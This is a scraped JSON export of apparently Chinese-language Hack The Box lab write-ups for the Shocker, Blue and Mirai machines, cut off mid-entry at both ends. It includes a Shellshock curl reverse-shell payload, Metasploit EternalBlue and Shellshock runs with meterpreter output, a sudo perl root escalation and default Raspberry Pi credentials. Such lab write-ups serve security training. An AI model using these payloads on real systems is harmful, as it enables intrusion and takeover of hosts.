12]\nindex.html              [Status: 200, Size: 137, Words: 9, Lines: 10]\nserver-status           [Status: 403, Size: 299, Words: 22, Lines: 12]\n:: Progress: [4614/4614] :: Job [1/1] :: 80 req/sec :: Duration: [0:01:00] :: Errors: 0 ::\n```\n看到有一个 cgi-bin 目录，继续 fuzz\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# ffuf -u \"http://10.10.10.56/cgi-bin/FUZZ\" -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt -e .sh,.pl\n\n        /'___\\  /'___\\           /'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v1.3.1 Kali Exclusive <3\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://10.10.10.56/cgi-bin/FUZZ\n :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt\n :: Extensions       : .sh .pl \n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200,204,301,302,307,401,403,405\n________________________________________________\n\nuser.sh                 [Status: 200, Size: 118, Words: 19, Lines: 8]\n                        [Status: 403, Size: 294, Words: 22, Lines: 12]\n:: Progress: [60348/60348] :: Job [1/1] :: 152 req/sec :: Duration: [0:15:14] :: Errors: 19 ::\n```\n发现一个 user.sh 文件，去查看一下\n\n![](Hackthebox-Shocker/5c08d0f2-9ef0-4c87-8204-d320484e4c83.png)\n\n有点不太明白这是啥，去 google 一下吧\n\n![](Hackthebox-Shocker/77210a46-884f-46be-a4ad-9612a2e8a223.png)\n\n> [https://antonyt.com/blog/2020-03-27/exploiting-cgi-scripts-with-shellshock](https://antonyt.com/blog/2020-03-27/exploiting-cgi-scripts-with-shellshock)\n\n找到一篇文章\n\n# 漏洞利用\n## Shellshock\n根据文章内容，尝试一下反弹 shell\n\n使用 nc 监听一个端口\n\n```bash\nnc -nvlp 4444\n```\n然后去利用\n\n```bash\ncurl -i -H \"User-agent: () { :;}; /bin/bash -i >& /dev/tcp/10.10.14.4/4444 0>&1\" http://10.10.10.56/cgi-bin/user.sh\n```\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# nc -nvlp 4444                                                                                                                                                                                               1 ⨯\nlistening on [any] 4444 ...\nconnect to [10.10.14.4] from (UNKNOWN) [10.10.10.56] 40320\nbash: no job control in this shell\nshelly@Shocker:/usr/lib/cgi-bin$ whoami&&id\nwhoami&&id\nshelly\nuid=1000(shelly) gid=1000(shelly) groups=1000(shelly),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)\nshelly@Shocker:/usr/lib/cgi-bin$\n```\n成功得到一个 user 权限的 shell\n\n## exploit-db\n> [https://www.exploit-db.com/exploits/34900](https://www.exploit-db.com/exploits/34900)\n\n我这边利用有点问题，就不测试了\n\n## Metasploit\n```bash\nuse exploit/multi/http/apache_mod_cgi_bash_env_exec\n```\n```bash\nmsf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > show options \n\nModule options (exploit/multi/http/apache_mod_cgi_bash_env_exec):\n\n   Name            Current Setting   Required  Description\n   ----            ---------------   --------  -----------\n   CMD_MAX_LENGTH  2048              yes       CMD max line length\n   CVE             CVE-2014-6271     yes       CVE to check/exploit (Accepted: CVE-2014-6271, CVE-2014-6278)\n   HEADER          User-Agent        yes       HTTP header to use\n   METHOD          GET               yes       HTTP method to use\n   Proxies                           no        A proxy chain of format type:host:port[,type:host:port][...]\n   RHOSTS          10.10.10.56       yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'\n   RPATH           /bin              yes       Target PATH for binaries used by the CmdStager\n   RPORT           80                yes       The target port (TCP)\n   SRVHOST         0.0.0.0           yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.\n   SRVPORT         8080              yes       The local port to listen on.\n   SSL             false             no        Negotiate SSL/TLS for outgoing connections\n   SSLCert                           no        Path to a custom SSL certificate (default is randomly generated)\n   TARGETURI       /cgi-bin/user.sh  yes       Path to CGI script\n   TIMEOUT         5                 yes       HTTP read response timeout (seconds)\n   URIPATH                           no        The URI to use for this exploit (default is random)\n   VHOST                             no        HTTP server virtual host\n\nPayload options (linux/x86/meterpreter/reverse_tcp):\n\n   Name   Current Setting  Required  Description\n   ----   ---------------  --------  -----------\n   LHOST  10.10.14.4       yes       The listen address (an interface may be specified)\n   LPORT  4444             yes       The listen port\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   Linux x86\n```\n设置好相关的配置后，执行\n\n```bash\nmsf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > exploit \n\n[*] Started reverse TCP handler on 10.10.14.4:4444 \n[*] Command Stager progress - 100.46% done (1097/1092 bytes)\n[*] Sending stage (984904 bytes) to 10.10.10.56\n[*] Meterpreter session 2 opened (10.10.14.4:4444 -> 10.10.10.56:40322) at 2022-04-02 00:56:02 -0400\n\nmeterpreter > getuid\nServer username: shelly @ Shocker (uid=1000, gid=1000, euid=1000, egid=1000)\n```\n这里也成功回弹\n\n## 修复 shell\n```bash\npython3 -c \"import pty;pty.spawn('/bin/bash')\";\nCtrl+Z返回\nstty raw -echo; fg\nexport TERM=xterm\nstty rows 51 cols 237\n```\n```bash\nshelly@Shocker:/home/shelly$ cat user.txt \n2ec24e11320026d1e70ff3e16695b233\n```\n成功拿到 user 权限的 flag 文件\n\n# 权限提升\n```bash\nshelly@Shocker:/home/shelly$ sudo -l\nMatching Defaults entries for shelly on Shocker:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser shelly may run the following commands on Shocker:\n    (root) NOPASSWD: /usr/bin/perl\n```\n使用 sudo -l 查看得知有权限使用 sudo 运行 /usr/bin/perl\n\n> [https://gtfobins.github.io/gtfobins/perl/](https://gtfobins.github.io/gtfobins/perl/)\n\nperl 可以用上面的方法提权，尝试一下\n\n```bash\nsudo /usr/bin/perl -e 'exec \"/bin/sh\";'\n\nshelly@Shocker:/usr/lib/cgi-bin$ sudo /usr/bin/perl -e 'exec \"/bin/sh\";'\n# whoami&&id\nroot\nuid=0(root) gid=0(root) groups=0(root)\n```\n成功提权到 root 权限\n\n```bash\n# cat root.txt\n52c2715605d70c7619030560dc1ca467\n```\n成功拿到 root 权限的 flag 文件","tags":["Hackthebox"]},{"title":"Blue - Hackthebox","url":"/2022/04/03/Hackthebox/Easy/Hackthebox-Blue/","content":"\n# Hackthebox - Blue\n# 靶场信息\n![](Hackthebox-Blue/21028bc5-93be-4895-922f-8482f48df346.png)\n\n# 靶场类型\n![](Hackthebox-Blue/e4037710-db52-4942-941f-0f5c0f5d5016.png)\n\n# 信息搜集\n## Nmap\n```bash\n┌──(root💀kali)-[~/Desktop/HTB/Easy/Blue]\n└─# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.10.40 \nStarting Nmap 7.91 ( https://nmap.org ) at 2022-03-30 00:22 EDT\nNmap scan report for 10.10.10.40\nHost is up (0.57s latency).\nNot shown: 60896 filtered ports, 4636 closed ports\nPORT    STATE SERVICE    VERSION\n135/tcp open  tcpwrapped\n139/tcp open  tcpwrapped\n445/tcp open  tcpwrapped Windows 7 Professional 7601 Service Pack 1 tcpwrapped\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.91%E=4%D=3/30%OT=445%CT=21%CU=36006%PV=Y%DS=2%DC=T%G=Y%TM=6243D\nOS:C0A%P=x86_64-pc-linux-gnu)SEQ(CI=I)SEQ(SP=106%GCD=1%ISR=108%TI=I%CI=I%II\nOS:=I%SS=S%TS=7)OPS(O1=M54BNW8ST11%O2=M54BNW8ST11%O3=M54BNW8NNT11%O4=M54BNW\nOS:8ST11%O5=M54BNW8ST11%O6=M54BST11)WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=\nOS:2000%W6=2000)ECN(R=N)ECN(R=Y%DF=Y%T=80%W=2000%O=M54BNW8NNS%CC=N%Q=)T1(R=\nOS:N)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T2(R=Y%DF=Y%T=80%W=0%S=Z\nOS:%A=S%F=AR%O=%RD=0%Q=)T3(R=N)T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=\nOS:)T4(R=N)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=N)T5(R=Y%DF=Y%T\nOS:=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=N)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R\nOS:%O=%RD=0%Q=)T7(R=N)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=N)\nOS:U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=N)I\nOS:E(R=Y%DFI=N%T=80%CD=Z)\n\nNetwork Distance: 2 hops\n\nHost script results:\n|_clock-skew: mean: -19m57s, deviation: 34m37s, median: 1s\n| smb-os-discovery: \n|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)\n|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional\n|   Computer name: haris-PC\n|   NetBIOS computer name: HARIS-PC\\x00\n|   Workgroup: WORKGROUP\\x00\n|_  System time: 2022-03-30T05:26:31+01:00\n| smb-security-mode: \n|   account_used: guest\n|   authentication_level: user\n|   challenge_response: supported\n|_  message_signing: disabled (dangerous, but default)\n| smb2-security-mode: \n|   2.02: \n|_    Message signing enabled but not required\n| smb2-time: \n|   date: 2022-03-30T04:26:34\n|_  start_date: 2022-03-30T04:03:04\n\nTRACEROUTE (using port 995/tcp)\nHOP RTT       ADDRESS\n1   552.18 ms 10.10.16.1\n2   255.14 ms 10.10.10.40\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 238.83 seconds\n```\n这台很明显了，而且相信大家看名字就已经很明确了，我就不多说了，直接利用吧\n\n## 永恒之蓝\n### Nmap\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# nmap --script=vuln 10.10.10.40                      \nStarting Nmap 7.91 ( https://nmap.org ) at 2022-03-30 00:29 EDT\nNmap scan report for 10.10.10.40\nHost is up (0.54s latency).\nNot shown: 991 closed ports\nPORT      STATE SERVICE\n135/tcp   open  msrpc\n139/tcp   open  netbios-ssn\n445/tcp   open  microsoft-ds\n49152/tcp open  unknown\n49153/tcp open  unknown\n49154/tcp open  unknown\n49155/tcp open  unknown\n49156/tcp open  unknown\n49157/tcp open  unknown\n\nHost script results:\n|_smb-vuln-ms10-054: false\n|_smb-vuln-ms10-061: NT_STATUS_OBJECT_NAME_NOT_FOUND\n| smb-vuln-ms17-010: \n|   VULNERABLE:\n|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)\n|     State: VULNERABLE\n|     IDs:  CVE:CVE-2017-0143\n|     Risk factor: HIGH\n|       A critical remote code execution vulnerability exists in Microsoft SMBv1\n|        servers (ms17-010).\n|           \n|     Disclosure date: 2017-03-14\n|     References:\n|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/\n|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143\n|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx\n\nNmap done: 1 IP address (1 host up) scanned in 173.70 seconds\n```\n确认存在\n\n### Metasploit\n```bash\nuse auxiliary/scanner/smb/smb_ms17_010\n\nmsf6 auxiliary(scanner/smb/smb_ms17_010) > show options \n\nModule options (auxiliary/scanner/smb/smb_ms17_010):\n\n   Name         Current Setting                                                 Required  Description\n   ----         ---------------                                                 --------  -----------\n   CHECK_ARCH   true                                                            no        Check for architecture on vulnerable hosts\n   CHECK_DOPU   true                                                            no        Check for DOUBLEPULSAR on vulnerable hosts\n   CHECK_PIPE   false                                                           no        Check for named pipe on vulnerable hosts\n   NAMED_PIPES  /usr/share/metasploit-framework/data/wordlists/named_pipes.txt  yes       List of named pipes to check\n   RHOSTS       10.10.10.40                                                     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'\n   RPORT        445                                                             yes       The SMB service port (TCP)\n   SMBDomain    .                                                               no        The Windows domain to use for authentication\n   SMBPass                                                                      no        The password for the specified username\n   SMBUser                                                                      no        The username to authenticate as\n   THREADS      1                                                               yes       The number of concurrent threads (max one per host)\n```\n```bash\nmsf6 auxiliary(scanner/smb/smb_ms17_010) > exploit \n\n[+] 10.10.10.40:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)\n[*] 10.10.10.40:445       - Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\n```\n确认存在\n\n# 漏洞利用\n## Metasploit\n```bash\nmsf6 exploit(windows/smb/ms17_010_eternalblue) > show options \n\nModule options (exploit/windows/smb/ms17_010_eternalblue):\n\n   Name           Current Setting  Required  Description\n   ----           ---------------  --------  -----------\n   RHOSTS         10.10.10.40      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'\n   RPORT          445              yes       The target port (TCP)\n   SMBDomain      .                no        (Optional) The Windows domain to use for authentication\n   SMBPass                         no        (Optional) The password for the specified username\n   SMBUser                         no        (Optional) The username to authenticate as\n   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.\n   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.\n\nPayload options (windows/x64/meterpreter/reverse_tcp):\n\n   Name      Current Setting  Required  Description\n   ----      ---------------  --------  -----------\n   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)\n   LHOST     10.10.16.4       yes       The listen address (an interface may be specified)\n   LPORT     4444             yes       The listen port\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   Windows 7 and Server 2008 R2 (x64) All Service Packs\n```\n```bash\nmsf6 exploit(windows/smb/ms17_010_eternalblue) > exploit \n\n[*] Started reverse TCP handler on 10.10.16.4:4444 \n[*] 10.10.10.40:445 - Executing automatic check (disable AutoCheck to override)\n[*] 10.10.10.40:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check\n[+] 10.10.10.40:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)\n[*] 10.10.10.40:445       - Scanned 1 of 1 hosts (100% complete)\n[+] 10.10.10.40:445 - The target is vulnerable.\n[*] 10.10.10.40:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check\n[+] 10.10.10.40:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)\n[*] 10.10.10.40:445       - Scanned 1 of 1 hosts (100% complete)\n[*] 10.10.10.40:445 - Connecting to target for exploitation.\n[+] 10.10.10.40:445 - Connection established for exploitation.\n[+] 10.10.10.40:445 - Target OS selected valid for OS indicated by SMB reply\n[*] 10.10.10.40:445 - CORE raw buffer dump (42 bytes)\n[*] 10.10.10.40:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes\n[*] 10.10.10.40:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv\n[*] 10.10.10.40:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      \n[+] 10.10.10.40:445 - Target arch selected valid for arch indicated by DCE/RPC reply\n[*] 10.10.10.40:445 - Trying exploit with 12 Groom Allocations.\n[*] 10.10.10.40:445 - Sending all but last fragment of exploit packet\n[*] 10.10.10.40:445 - Starting non-paged pool grooming\n[+] 10.10.10.40:445 - Sending SMBv2 buffers\n[+] 10.10.10.40:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.\n[*] 10.10.10.40:445 - Sending final SMBv2 buffers.\n[*] 10.10.10.40:445 - Sending last fragment of exploit packet!\n[*] 10.10.10.40:445 - Receiving response from exploit packet\n[+] 10.10.10.40:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!\n[*] 10.10.10.40:445 - Sending egg to corrupted connection.\n[*] 10.10.10.40:445 - Triggering free of corrupted buffer.\n[*] Sending stage (200262 bytes) to 10.10.10.40\n[*] Meterpreter session 1 opened (10.10.16.4:4444 -> 10.10.10.40:49158) at 2022-03-30 00:34:57 -0400\n[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\n[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\n[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\n\nmeterpreter > getuid\nServer username: NT AUTHORITY\\SYSTEM\n```\n利用成功\n\n```bash\nmeterpreter > search -f user.txt\nFound 1 result...\n    c:\\Users\\haris\\Desktop\\user.txt (34 bytes)\nmeterpreter > search -f root.txt\nFound 1 result...\n    c:\\Users\\Administrator\\Desktop\\root.txt (34 bytes)\nmeterpreter > cat 'c:\\Users\\haris\\Desktop\\user.txt'\ncf2da488a16cd6551e8813a3f3b2ad0a\nmeterpreter > cat 'c:\\Users\\Administrator\\Desktop\\root.txt'\n36bf758af3a68b38f132c2e4b2bc4531\n```\n成功拿到 user 权限和 root 权限的 flag 文件","tags":["Hackthebox"]},{"title":"Mirai - Hackthebox","url":"/2022/04/02/Hackthebox/Easy/Hackthebox-Mirai/","content":"\n# Hackthebox - Mirai\n# 靶场信息\n![](Hackthebox-Mirai/84a4d86d-4be3-4692-910f-9c3478f2e95f.png)\n\n# 靶场类型\n![](Hackthebox-Mirai/fdb4e52f-9bb3-4032-ab06-2951b7c36f47.png)\n\n# 信息搜集\n## Nmap\n```bash\n┌──(root💀kali)-[~/Desktop/HTB/Easy/Mirai]\n└─# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.10.48\nStarting Nmap 7.91 ( https://nmap.org ) at 2022-03-30 00:47 EDT\nNmap scan report for 10.10.10.48\nHost is up (7.9s latency).\nNot shown: 63987 filtered ports, 1545 closed ports\nPORT   STATE SERVICE    VERSION\n22/tcp open  tcpwrapped\n| ssh-hostkey: \n|   1024 aa:ef:5c:e0:8e:86:97:82:47:ff:4a:e5:40:18:90:c5 (DSA)\n|   2048 e8:c1:9d:c5:43:ab:fe:61:23:3b:d7:e4:af:9b:74:18 (RSA)\n|   256 b6:a0:78:38:d0:c8:10:94:8b:44:b2:ea:a0:17:42:2b (ECDSA)\n|_  256 4d:68:40:f7:20:c4:e5:52:80:7a:44:38:b8:a2:a7:52 (ED25519)\n53/tcp open  tcpwrapped\n| dns-nsid: \n|_  bind.version: dnsmasq-2.76\n80/tcp open  tcpwrapped\n|_http-server-header: lighttpd/1.4.35\n|_http-title: Site doesn't have a title (text/html; charset=UTF-8).\nDevice type: firewall\nRunning (JUST GUESSING): Fortinet embedded (87%)\nOS CPE: cpe:/h:fortinet:fortigate_100d\nAggressive OS guesses: Fortinet FortiGate 100D firewall (87%)\nNo exact OS matches for host (test conditions non-ideal).\n\nTRACEROUTE (using port 587/tcp)\nHOP RTT    ADDRESS\n1   ... 30\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 226.95 seconds\n```\n## Http\n![](Hackthebox-Mirai/01666f8d-186c-423f-9cc1-6e32bf5eb6ca.png)\n\n直接访问发现找不到网页，联想到有 53 端口，做一个本地 DNS 解析。\n\n```bash\necho 10.10.10.48 mirai.htb >> /etc/hosts\n```\n然后去访问 mirai.htb\n\n![](Hackthebox-Mirai/f052fc73-65c0-48b6-b7e6-5904024146b6.png)\n\n该网站似乎开启了白名单验证机制，咱们抓个包看看\n\n![](Hackthebox-Mirai/67052bdd-27a8-4c3d-ac3e-88a87eed2977.png)\n\n也没看到什么有用的东西，去看看是否有可利用的漏洞吧\n\n## Fuzz\n去 fuzz 一下看看有没有可用的文件\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# ffuf -u \"http://mirai.htb/FUZZ\" -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt -fw 400  \n\n        /'___\\  /'___\\           /'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v1.3.1 Kali Exclusive <3\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://mirai.htb/FUZZ\n :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200,204,301,302,307,401,403,405\n :: Filter           : Response words: 400\n________________________________________________\n\nadmin                   [Status: 301, Size: 0, Words: 1, Lines: 1]\n```\n有一个 admin 目录，访问一下\n\n![](Hackthebox-Mirai/509a43fc-f3a6-4bef-80d1-6e5c896997d9.png)\n\n似乎是一个树莓派的界面，去登录试试\n\n![](Hackthebox-Mirai/43160462-2131-48d3-ab7f-19e16c18f846.png)\n\n登录失败，经过搜索后发现，树莓派是没有默认密码的，全是随机密码\n\n但同时也知道了树莓派的默认 ssh 密码\n\n```bash\nusername = pi\npassword = raspberry\n```\n去登录一下\n\n# 漏洞利用\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# ssh pi@10.10.10.48                \nThe authenticity of host '10.10.10.48 (10.10.10.48)' can't be established.\nECDSA key fingerprint is SHA256:UkDz3Z1kWt2O5g2GRlullQ3UY/cVIx/oXtiqLPXiXMY.\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added '10.10.10.48' (ECDSA) to the list of known hosts.\npi@10.10.10.48's password: \n\nThe programs included with the Debian GNU/Linux system are free software;\nthe exact distribution terms for each program are described in the\nindividual files in /usr/share/doc/*/copyright.\n\nDebian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent\npermitted by applicable law.\nLast login: Sun Aug 27 14:47:50 2017 from localhost\n\nSSH is enabled and the default password for the 'pi' user has not been changed.\nThis is a security risk - please login as the 'pi' user and type 'passwd' to set a new password.\n\nSSH is enabled and the default password for the 'pi' user has not been changed.\nThis is a security risk - please login as the 'pi' user and type 'passwd' to set a new password.\n\npi@raspberrypi:~ $ whoami&&id\npi\nuid=1000(pi) gid=1000(pi) groups=1000(pi),4(adm),20(dialout),24(cdrom),27(sudo),29(audio),44(video),46(plugdev),60(games),100(users),101(input),108(netdev),117(i2c),998(gpio),999(spi)\n```\n成功获得一个 user 权限\n\n```bash\npi@raspberrypi:~/Desktop $ cat user.txt \nff837707441b257a20e32199d7c8838d\n```\n成功获得 user 权限的 flag 文件\n\n# 权限提升\n```bash\npi@raspberrypi:~/Desktop $ sudo -l\nMatching Defaults entries for pi on localhost:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser pi may run the following commands on localhost:\n    (ALL : ALL) ALL\n    (ALL) NOPASSWD: ALL\n```\n使用 sudo -l 查看一下当前 sudo 权限，发现拥有所有权限，那直接提权吧\n\n```bash\npi@raspberrypi:~/Desktop $ sudo su\nroot@raspberrypi:/home/pi/Desktop# whoami&&id\nroot\nuid=0(root) gid=0(root) groups=0(root)\n```\n成功获得 root 权限\n\n```bash\nroot@raspberrypi:~# cat root.txt \nI lost my original root.txt! I think I may have a backup on my USB stick...\n```\n成功获。。。嗯？不太对，root 权限的 flag 文件丢失，但是提示可能在 U 盘里有备份\n\n```bash\nroot@raspberrypi:/# mount\nsysfs on /sys type sysfs (rw,nosuid,nodev,noexec,relatime)\nproc on /proc type proc (rw,nosuid,nodev,noexec,relatime)\ntmpfs on /run type tmpfs (rw,nosuid,relatime,size=102396k,mode=755)\n/dev/sda1 on /lib/live/mount/persistence/sda1 type iso9660 (ro,noatime)\n/dev/loop0 on /lib/live/mount/rootfs/filesystem.squashfs type squashfs (ro,noatime)\ntmpfs on /lib/live/mount/overlay type tmpfs (rw,relatime)\n/dev/sda2 on /lib/live/mount/persistence/sda2 type ext4 (rw,noatime,data=ordered)\naufs on / type aufs (rw,noatime,si=795e312f,noxino)\ndevtmpfs on /dev type devtmpfs (rw,nosuid,size=10240k,nr_inodes=58955,mode=755)\nsecurityfs on /sys/kernel/security type securityfs (rw,nosuid,nodev,noexec,relatime)\ntmpfs on /dev/shm type tmpfs (rw,nosuid,nodev)\ndevpts on /dev/pts type devpts (rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=000)\ntmpfs on /run/lock type tmpfs (rw,nosuid,nodev,noexec,relatime,size=5120k)\ntmpfs on /sys/fs/cgroup type tmpfs (ro,nosuid,nodev,noexec,mode=755)\ncgroup on /sys/fs/cgroup/systemd type cgroup (rw,nosuid,nodev,noexec,relatime,xattr,release_agent=/lib/systemd/systemd-cgroups-agent,name=systemd)\npstore on /sys/fs/pstore type pstore (rw,nosuid,nodev,noexec,relatime)\ncgroup on /sys/fs/cgroup/cpuset type cgroup (rw,nosuid,nodev,noexec,relatime,cpuset)\ncgroup on /sys/fs/cgroup/cpu,cpuacct type cgroup (rw,nosuid,nodev,noexec,relatime,cpu,cpuacct)\ncgroup on /sys/fs/cgroup/devices type cgroup (rw,nosuid,nodev,noexec,relatime,devices)\ncgroup on /sys/fs/cgroup/freezer type cgroup (rw,nosuid,nodev,noexec,relatime,freezer)\ncgroup on /sys/fs/cgroup/net_cls,net_prio type cgroup (rw,nosuid,nodev,noexec,relatime,net_cls,net_prio)\ncgroup on /sys/fs/cgroup/blkio type cgroup (rw,nosuid,nodev,noexec,relatime,blkio)\ncgroup on /sys/fs/cgroup/perf_event type cgroup (rw,nosuid,nodev,noexec,relatime,perf_event)\nsystemd-1 on /proc/sys/fs/binfmt_misc type autofs (rw,relatime,fd=22,pgrp=1,timeout=300,minproto=5,maxproto=5,direct)\nhugetlbfs on /dev/hugepages type hugetlbfs (rw,relatime)\nmqueue on /dev/mqueue type mqueue (rw,relatime)\ndebugfs on /sys/kernel/debug type debugfs (rw,relatime)\ntmpfs on /tmp type tmpfs (rw,nosuid,nodev,relatime)\n/dev/sdb on /media/usbstick type ext4 (ro,nosuid,nodev,noexec,relatime,data=ordered)\ntmpfs on /run/user/999 type tmpfs (rw,nosuid,nodev,relatime,size=51200k,mode=700,uid=999,gid=997)\ntmpfs on /run/user/1000 type tmpfs (rw,nosuid,nodev,relatime,size=51200k,mode=700,uid=1000,gid=1000)\n```\n使用 mount 查看一下挂载了哪些外部驱动器\n\n我们把眼光放在倒数第三行上\n\n```bash\n/dev/sdb on /media/usbstick type ext4 (ro,nosuid,nodev,noexec,relatime,data=ordered)\n```\n/media/usbstick 应该就是了，去看看\n\n```bash\nroot@raspberrypi:/# cd /media/usbstick\nroot@raspberrypi:/media/usbstick# ls -la\ntotal 18\ndrwxr-xr-x 3 root root  1024 Aug 14  2017 .\ndrwxr-xr-x 3 root root  4096 Aug 14  2017 ..\n-rw-r--r-- 1 root root   129 Aug 14  2017 damnit.txt\ndrwx------ 2 root root 12288 Aug 14  2017 lost+found\n```\n这里有一个 damnit.txt 文件，查看一下\n\n```bash\nroot@raspberrypi:/media/usbstick# cat damnit.txt \nDamnit! Sorry man I accidentally deleted your files off the USB stick.\nDo you know if there is any way to get them back?\n\n-James\n```\n这又是嘛玩意儿\n\nJames 不小心把我们 U 盘的文件给删了？你搁这跟我套娃呢？\n\n我们应该是在 /dev/sdb 分区上，使用 strings 命令列出以前在 /dev/sdb 分区上执行过的命令\n\n```bash\nroot@raspberrypi:/media/usbstick# strings /dev/sdb\n>r &\n/media/usbstick\nlost+found\nroot.txt\ndamnit.txt\n>r &\n>r &\n/media/usbstick\nlost+found\nroot.txt\ndamnit.txt\n>r &\n/media/usbstick\n2]8^\nlost+found\nroot.txt\ndamnit.txt\n>r &\n3d3e483143ff12ec505d026fa13e020b\nDamnit! Sorry man I accidentally deleted your files off the USB stick.\nDo you know if there is any way to get them back?\n-James\n```\n行吧，以前查看过我们的 flag 文件，也算是拿到了 root 权限的 flag 文件吧","tags":["Hackthebox"]},{"title":"Timelapse - Hackthebox","url":"/2022/04/01/Hackthebox/Easy/Hackthebox-Timelapse/","content":"\n# Hackthebox - Timelapse\n# 靶场信息\n![](Hackthebox-Timelapse/21d30a56-eb87-405e-a64a-7d06304b00b0.png)\n\n# 靶场类型\n![](Hackthebox-Timelapse/d71ce49e-2d3d-42f1-aa45-a4feaaff6b38.png)\n\n# 信息搜集\n## Nmap\n```bash\n┌──(root💀kali)-[~/Desktop/HTB/Easy/Timelapse]\n└─# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.11.152\nStarting Nmap 7.91 ( https://nmap.org ) at 2022-03-29 02:18 EDT\nNmap scan report for 10.10.11.152\nHost is up 